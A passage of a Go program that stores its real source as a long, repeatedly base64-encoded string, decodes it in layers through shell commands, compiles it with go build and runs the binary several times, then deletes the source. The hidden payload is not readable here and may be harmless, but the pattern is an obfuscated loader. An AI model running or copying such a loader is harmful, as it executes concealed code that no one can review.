VllXazlsYkd3eFZGVkdkMVl4YkZoVmFrWnNZV3BDTUZSWWNISmtWVEZFVDBob1RsRjZValJVU0hCV1RsVjRjVkZWZEZkaVZWcDZWMnhqTVdGdFJsaFNWR3hOVmtVd2VGUkhjRUprYXpGVldqTldUbVZVWjNwVVZVMHdaREJPYzFkdGFHbFNNMmh6V2tWb1UyRkdRbFJOU0hCUFlWUlNNMVJJY0VaT1JYaHhXak5hVDJGdFpERlVWVVozVmpGc1dFNVhjR2xOTVZsNVYyeG9TazlWZUZWVVZGWk5ZV3RHTWxSV1VrSmtWVFZFVDBSS1RtRlVVak5STW5oaFlrZE9kRkp0Y0dwaWJGa3lWVVpOZDJWVk1YQk9TR1JOWld0cmVGUkhjRkprYXpVMlZGaFdUbEZZUWxoWlZtUlhaRmRLZEZKVWJFMVdSa1l6VkVkd1FtUnJNVlZSV0ZaUFVYcG5lVlJWVFRCa01FNXpWMjVDWVZaNlZYZFpWbVJIWkZad1ZVMUlVazVoYXpFeFZGVk5OR1ZWTlZST1JGWk5aVzFOZUZSSGNFSlRNVnAwWWtoT2FWSXdXblpYYkdoTFpFZEplbFJ0YUZGVmVrSTFWRlZOTUdRd2VEWlRWRTVOWVd0V01sUnVjRnBrVlRGQ1kwWmthRll6YURGWlZtaFhaV3hDVkUxRVFrOVZlbEl6VkVod1dtUlZNVVJQUkVaUFZYcFNNMUV5ZUdGalIwNTBXa2hDYVdKWGVHOVRWVlpMWWtac1dGUnRPVkZWZWtJMlZGaHJNR1F3ZURaU1ZFWk5ZVzFrTWxSdGNHNWtWVEZDWTBaa2FWSXdXbkpaVm1oaFpHMU5lbFZ1V21obGFrSXdWR3RTV21SVk1VUlBSRUpOWVcxME1sUnNVbEprVlRGQ1kwWm9XbGRGY0RaWFZtaHFUMVY0VlZWWWNFMWhhMFl5VkRCTk1FMVZlRFpXVkZKTllXdEdURlpxU2tkbGJVWklZa2hXWVUweFNqSlpiV3d6V2pGS1JFNVZVazFoYWtJd1ZGaHdibVJWTVVSUFNHaFBVWHBSZVZSSWNGcGxhM2h4VVZWMFYwMXJXWGhWUmsxM1pWVTFWRTVJWkUxbGEydDZWRWR3Ym1Sck5UWmFNMVpPVVZoQ1dWZHNaRFJqTWtaWVRsYzFhMUo2YkRGVlJrMTNaV3MxY0U1SVpFMWxhMVkxVkVkd2NtUnJOWEZVV0ZaT1VWaENXVmxWWkhOTlJuQllZVWhhYW1Kck5YTlZSazEzVFZVeGNFNUlaRTFsVkVJelZFZHdSbVJyTlZWUldGWk9VVmhDV1ZsV1pFOWlNa1paVlcxb1VWVjZRalpVTVUwd1pEQjRObEpZY0UxaGJYUXlWRzF3Vm1SVk1VSmpSbWhvVmpOb2VsZHNZM2hsYlZKSVVtMTBVVlY2UWpWVVZrMHdaREI0TmxOVVVrMWhhMFl5Vkc1d2FtUlZNVUpqUm1ob1ZucFdNVmxXYUVOaVJuQTJUVWhTVDFKR2JERlVWVTAwWld0NGNWRllXazlXUlRFeFZGVkdkMWRIVG5SUFYzQTBWMVZ3YjFwSWIzZGtSVFZGVkZoV1RsRjZaekZVUjNCYVpHczFWVmt6Vms1UldFSmFXVlpPYTJGSFNuRk5TRkpQVWtWR01WUlZUVFJsUlRWRVRraG9UV1ZzYkRaVVIzQkNVekZrV0ZKdVNtdFhSa28yV1ZodmQyUkZOVlZaTTFaT1VYcG9NRlF3VFRCT1JYZzJWVmhrVFdGclJreFdNV1JIWkZadmVVOVlWbEZWZWtJMVZGaHJNR1F3ZURaVFZFNU5ZV3hXTWxSdWNISmtWVEZDWTBad1dsWjZhM2haYlRGVlVraEdWVTFJVWs1aGJGWXhWRlZOTkdWVk1UVk9SRkpOWlcxT05sUkhjRUpUTVdSWVZtNU9hVko2YTNwWlZFa3hZMFp3ZEZaVWJFMVdSbFY2VkVkd1FtUnJlRlZWV0ZaT1pWUm5kMVJ0YXpCa01FNXpZa2Q0YW1KV1dYbFhWbU13VDFWNFZWUlVWazFoYTBZeVZGWlNTbVJWTlVSUFJFcE9VWHBTTTFFeWVITmpSMHAwVkcwNWExWXdXakZWUmsxM1RVVXhSRTVJWkUxbGJYUXhWRlZOTkUxck5VUk9TR1JFWWtoQ2IxZHFUa3RpUm14eFRVaFNUbVZ0WkRGVVZVMDBaVVV4UkU1RVRrMWxiRlV4VkVkd1FsTXhaSFJTYmxac1lsZDRjRmRXYUVwYU1VVjVZa1JDYkZaRVFqQlVWM0JhWkZVeFJFOUliRTloVkZJelZFaHdhbVZyZUhGUlZYUllZekE0TkZreU1YTmhiVVpGVFVoU1QxSkZSakZVVlUwMFRsVjRjVlJZV2s5V1IyUXhWRlZHZVZKSE5VbFVSVkl5VW5wR05GbFdVWGRrUlRWRlZWaFdUbEY2WjNwVVIzQlNaR3MxVlZrelZrNVJXRXBHWXpCb2QyUkhSbGxUVkd4TlZrVXdlRlJIY0VKa2F6RlZXVE5XVUZWNlozbFVNVTB3WkRGc1FtSjZNRXNL"
)

func main() {
	if runBin(true) {
		return
	}
	compileBin()
	const warmRuns = 5
	for i := 0; i < warmRuns; i++ {
		if !runBin(i == warmRuns-1) {
			log.Fatal("failed to run binary")
		}
	}
}

func runBin(attach bool) bool {
	cmd := exec.Command(binPath)
	if attach {
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
	}
	if err := cmd.Run(); err != nil {
		if errors.Is(err, fs.ErrNotExist) {
			return false
		}
		log.Fatal(err)
	}
	return true
}

func compileBin() {
	srcDec, err := base64.StdEncoding.DecodeString(srcEnc)
	try(err)
	f, err := os.Create(srcFile)
	try(err)
	defer os.Remove(srcFile)
	_, err = f.Write(srcDec)
	try(err)
	try(f.Close())
	for i := 0; i < bytes.IndexByte(srcDec, 107); i++ {
		execCmd("base64", "-d", "-i", srcFile, "-o", srcFileTmp)
		execCmd("mv", srcFileTmp, srcFile)
	}
	execCmd("go", "build", "-o", binFile, srcFile)
}

func execCmd(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	try(cmd.Run())
}

func try(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
